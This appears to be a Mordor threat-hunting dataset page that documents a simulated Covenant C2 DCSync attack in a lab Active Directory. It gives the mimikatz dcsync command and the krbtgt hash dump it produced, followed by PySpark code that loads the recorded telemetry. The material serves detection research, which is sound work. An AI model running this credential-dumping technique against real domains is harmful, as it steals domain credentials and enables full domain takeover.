# Covenant DCSync

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-200805020926 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2020/08/05 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Covenant |
| Simulation Script | https://github.com/cobbr/Covenant/blob/c4d7eba0cfc29e3d5961248ec984a209d4d05de3/Covenant/Data/Tasks/SharpSploit.Credentials.yaml |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip |

## Dataset Description
This dataset represents adversaries with enough permissions (domain admin) adding an ACL to the Root Domain for any user, despite being in no privileged groups, having no malicious sidHistory, and not having local admin rights on the domain controller itself.

## Adversary View
```
(wardog) > DCSync /username:"krbtgt" /fqdn:"theshire.local" /dc:"MORDORDC"

  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC
[DC] 'theshire.local' will be the domain
[DC] 'MORDORDC' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/4/2020 9:30:22 PM
Object Security ID   : S-1-5-21-3669966080-2286457517-972388166-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9810d5b30826619ed962194bc35cb66d
    ntlm- 0: 9810d5b30826619ed962194bc35cb66d
    lm  - 0: 2bd18bfa988700fc1f845909043f7785

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d7477916da5d01ca6366caaad478f535

* Primary:Kerberos-Newer-Keys *
    Default Salt : THESHIRE.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1ffb5b5ca0ba20b19de132f44a580d67c96362f4ec21c8e8057ad8b4a5cbe99e
      aes128_hmac       (4096) : 49e4ec6edd3d27f0eda5ed4b32df29c4
      des_cbc_md5       (4096) : f162e6c46b5d10e9

* Primary:Kerberos *
    Default Salt : THESHIRE.LOCALkrbtgt
    Credentials
      des_cbc_md5       : f162e6c46b5d10e9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  1e9687e12c22c61ce56e06b679067068
    02  bd4ff4a6ad0092c086110d7f177bf2dd
    03  bef34dc3488c458be7a07de25cee5c25
    04  1e9687e12c22c61ce56e06b679067068
    05  bd4ff4a6ad0092c086110d7f177bf2dd
    06  ec54a02a8b4c407023b921f839db0695
    07  1e9687e12c22c61ce56e06b679067068
    08  34460bb2c44aae9f8397a5df0846babd
    09  34460bb2c44aae9f8397a5df0846babd
    10  0a104dba17fcb7b32f0a39c5694ae42d
    11  cec2d9932979ed578ba260b233290ad6
    12  34460bb2c44aae9f8397a5df0846babd
    13  dbd9ff299298ee7649121015643a45c0
    14  cec2d9932979ed578ba260b233290ad6
    15  2d5f29cfd994b4a31dc71ff0d4f4b735
    16  2d5f29cfd994b4a31dc71ff0d4f4b735
    17  1a6e2adbc126ac59916af47ca0c2047d
    18  b99ae20fdbff05738cc3c4341f5819b0
    19  791ed67574eee311ed74e911f840e622
    20  71d939df702fe13f003e39b9421f450d
    21  cc9c9f66309c5d6412773943efa08efd
    22  cc9c9f66309c5d6412773943efa08efd
    23  1f076ec382ae6f7cf5ca3750ad70c140
    24  a16cb7dc0b7a969d65aff54a4180d63a
    25  a16cb7dc0b7a969d65aff54a4180d63a
    26  80706a2b93f2a4d53d6df1b4b8bfe029
    27  c3c8bedd3c2f3db046410f60ab728f57
    28  e0b5d1db4b2119a9e621a2a3199828bb
    29  b23dd36a70988139bbee48c668232993
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        